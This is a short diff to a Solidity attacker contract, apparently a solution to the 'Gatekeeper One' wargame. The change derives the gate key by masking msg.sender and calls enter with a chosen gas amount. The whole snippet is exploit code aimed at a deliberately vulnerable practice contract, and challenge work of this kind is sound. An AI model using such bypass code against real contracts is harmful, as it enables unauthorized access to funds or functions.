@@ -10,8 +10,9 @@ contract GatekeeperOneAttacker {
         gatekeeperOne = GatekeeperOne(_gatekeeperOneAddress);
     }
 
-    function attack(bytes8 _gateKey, uint256 gasToUse) external payable {
-        bool confirm = gatekeeperOne.enter{gas: gasToUse}(_gateKey);
+    function attack(uint256 gasToUse) external payable {
+        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);
+        bool confirm = gatekeeperOne.enter{gas: gasToUse}(key);
         require(confirm);
     }
 }
